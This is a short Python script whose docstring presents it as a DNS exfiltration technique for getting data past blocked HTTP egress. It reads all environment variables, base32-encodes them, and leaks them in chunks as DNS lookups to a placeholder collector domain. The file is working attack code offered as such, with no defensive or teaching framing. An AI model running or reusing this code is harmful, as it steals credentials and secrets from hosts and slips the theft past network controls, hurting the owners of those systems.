"""Exfiltration through DNS resolution.

The channel is the point. Where HTTP egress is blocked, name resolution is not:
the query leaves through the resolver the host already trusts, and the data
rides in the label.
"""

import base64
import os
import socket

blob = base64.b32encode(str(dict(os.environ)).encode()).decode().lower()

for index in range(0, len(blob), 60):
    socket.gethostbyname(blob[index : index + 60] + ".collector.invalid")
